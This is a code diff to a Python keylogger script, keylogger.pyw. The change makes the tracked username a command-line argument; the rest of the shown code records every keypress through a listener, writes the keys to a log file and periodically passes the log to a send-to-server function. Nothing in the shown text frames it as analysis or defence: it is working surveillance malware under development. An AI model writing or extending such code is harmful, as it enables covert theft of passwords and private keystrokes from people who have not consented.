@@ -3,9 +3,12 @@ import requests
 import os
 import requests
 import json
+import sys
 
-user = 'ashwin'
-logFilePath = './'+user+'_log.out'
+# user = 'ashwin'
+user = ''
+# logFilePath = './'+user+'_log.out'
+logFilePath = ''
 
 MAX_BUFFER_LEN = 10
 SEND_WRITE_COUNT = 3
@@ -45,6 +48,7 @@ def onKeyPress(key):
     logFile.write(data)
     buffer[:]=[]
     logFile.close()
+
     writeCount.append(1)
   
     if(len(writeCount) == SEND_WRITE_COUNT):
@@ -74,6 +78,14 @@ def sendDataToServer():
     open(logFilePath, 'w')
 
 if __name__ == "__main__":
+  if(len(sys.argv) < 2):
+    print("[ERROR] Invalid usage")
+    print("[INFO] Correct usage: python keylogger.pyw <user>")
+    exit(0)
+    
+  user = sys.argv[1]
+  logFilePath = './'+user+'_log.out'
+
   initialize()
 
   with Listener(on_press=onKeyPress) as listener:
